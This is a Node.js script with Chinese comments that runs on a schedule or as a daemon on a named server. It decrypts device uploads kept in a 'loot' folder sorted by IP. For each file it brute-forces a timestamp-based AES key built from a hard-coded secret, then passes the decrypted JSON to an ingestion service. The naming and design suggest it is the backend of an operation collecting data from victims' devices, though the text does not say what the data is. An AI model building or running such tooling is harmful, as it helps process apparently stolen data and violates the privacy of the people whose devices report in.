#!/usr/bin/env node
// decrypt_v6_watch.js — v6 上报自动解密（cron 每分钟跑）
// key = sha256(FIX16 + 13位ms时间戳)，明文格式 ^\d{13}{json}
// 扫描 loot/*/raw_*.bin 最近 10 分钟新文件 → 解密 → 存同目录 <原名>.json
// 部署: /www/wwwroot/i.131422.com/server/decrypt_v6_watch.js
// crontab: * * * * * /usr/bin/node /www/wwwroot/i.131422.com/server/decrypt_v6_watch.js >> /www/wwwroot/i.131422.com/server/decrypt_v6.log 2>&1
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const { hint } = require('./spool_hint');   // 【P2b】解密产物落地 → 提示 ingestd 入库

const LOOT_DIR = '/www/wwwroot/i.131422.com/loot';
const FIX16 = Buffer.from('37404c62226057355f3767584e3b3638', 'hex');
const WINDOW_MS = 30000;      // x_ts 与文件名时间戳偏差窗口
// 【2026-09-10 修复】原为 2000ms，导致部分设备（上传延迟大的，实测偏差 4.2~4.9s）
//   的上报全部 [MISS] —— 表现为「该设备解密率仅 26%，其余设备 97%」。
//   放宽到 30s：每文件最多多枚举 ~6万次 sha256+AES（约 0.1~1s），可接受。
const RECENT_MS = 10 * 60 * 1000;  // 只处理最近 10 分钟的新文件

function decrypt(ct, ts) {
    const key = crypto.createHash('sha256').update(Buffer.concat([FIX16, Buffer.from(String(ts))])).digest();
    try {
        const d = crypto.createDecipheriv('aes-256-ecb', key, null);
        d.setAutoPadding(true);
        const pt = Buffer.concat([d.update(ct), d.final()]).toString('utf8');
        if (/^\d{13}\{/.test(pt)) return pt;
    } catch (e) { /* try next ts */ }
    return null;
}

function processFile(binPath) {
    const base = path.basename(binPath);
    const m = base.match(/_(\d{13})\.bin$/);
    if (!m) return;
    const ts0 = parseInt(m[1], 10);
    let raw;
    try {
        raw = fs.readFileSync(binPath, 'utf8').trim();
    } catch (e) { return; }
    let ct;
    try {
        ct = Buffer.from(raw, 'base64');
    } catch (e) { return; }
    if (ct.length % 16 !== 0) return;
    if (raw.trim().length === 0) { console.log('[SKIP-EMPTY]', base); return true; }

    // 【2026-09-12 性能修复】原从 -30000 线性扫到 +30000：实测偏差 ~+4.9s 的文件要试
    //   3.5 万次 sha256+AES（≈0.5s/文件）→ 单轮 2-3 分钟 > cron 1 分钟 → 无 flock 时实例堆叠打满 CPU。
    //   改为从 0 向两侧扩散（覆盖范围不变，仅顺序不同）：绝大多数文件 ≤±5s 命中 → 几十~几千次即中。
    let pt = null;
    for (let i = 0; i <= WINDOW_MS && !pt; i++) {
        pt = decrypt(ct, ts0 + i);
        if (!pt && i > 0) pt = decrypt(ct, ts0 - i);
    }
    if (!pt) {
        console.log('[MISS]', base);
        return false;
    }
    const body = pt.slice(13);
    let obj;
    try { obj = JSON.parse(body); } catch (e) { obj = body; }
    const outPath = binPath.replace(/\.bin$/, '.json');
    fs.writeFileSync(outPath, JSON.stringify(obj, null, 2));
    hint(path.basename(path.dirname(binPath)));   // 【P2b】解密产物落地 → 提示 ingestd
    const et = (obj && obj.et) ? obj.et : '?';
    console.log('[OK]', base, 'ts=' + pt.slice(0, 13), 'et=' + et);
    return true;
}

// 扫 loot 下所有 IP 桶 + 根目录，找 raw_*.bin
// 模式: 默认只处理最近 RECENT_MS；env TODAY=1 时处理今天全部（含已解过的跳过逻辑仍生效）
// 【P4.1-5】解密失败（MISS）文件的内存缓存：1 小时冷却——避免常驻模式下对"永久失败"文件
//   每 15 秒重试一次（单文件 ±30s 枚举 ~0.5s）；成功/文件消失时从缓存移除。
const _missCache = new Map();
function scanOnce() {
    const now = Date.now();
    const todayOnly = process.env.TODAY === '1';
    let processed = 0, okN = 0, missN = 0;
    for (const entry of fs.readdirSync(LOOT_DIR)) {
        const dirPath = path.join(LOOT_DIR, entry);
        let st;
        try { st = fs.statSync(dirPath); } catch (e) { continue; }
        if (!st.isDirectory()) continue;
        let files;
        try { files = fs.readdirSync(dirPath); } catch (e) { continue; }
        for (const f of files) {
            if (!/^raw_.*_\d{13}\.bin$/.test(f)) continue;
            const jsonPath = path.join(dirPath, f.replace(/\.bin$/, '.json'));
            const fp = path.join(dirPath, f);
            let fst;
            try { fst = fs.statSync(fp); } catch (e) { continue; }
            if (!todayOnly) {
                if (fs.existsSync(jsonPath)) continue; // 已解过
                if (now - fst.mtimeMs > RECENT_MS) continue;
            } else {
                if (fst.mtimeMs < new Date(new Date().toDateString()).getTime()) continue; // 今天之前跳过
                if (fs.existsSync(jsonPath)) continue;
            }
            const _lastMiss = _missCache.get(fp);
            if (_lastMiss && now - _lastMiss < 3600000) continue;   // 1 小时冷却
            const res = processFile(fp);
            if (res === true) { _missCache.delete(fp); okN++; }
            else if (res === false) {
                _missCache.set(fp, now); missN++;
                if (_missCache.size > 8000) _missCache.clear();
            }
            processed++;
        }
    }
    console.log('processed', processed, 'ok', okN, 'miss', missN, 'at', new Date().toISOString());
}

// 【P4.1】常驻模式（--daemon 或 DECRYPT_DAEMON=1）：循环扫描，解密产物落地即 hint → ingestd 秒级入库。
//   整轮 = readdir 全桶 + existsSync 过滤（~10-20s）；轮内已解密的文件下轮 existsSync 直接跳过（幂等）。
if (process.argv.includes('--daemon') || process.env.DECRYPT_DAEMON === '1') {
    const interval = Math.max(5000, Number(process.env.DECRYPT_INTERVAL_MS || 20000));
    console.log('[daemon] decrypt_v6_watch 常驻启动 interval=' + interval + 'ms');
    const iter = () => {
        try { scanOnce(); } catch (e) { console.error('[daemon] scan 异常:', e.message); }
        setTimeout(iter, interval);
    };
    iter();
} else {
    scanOnce();
}
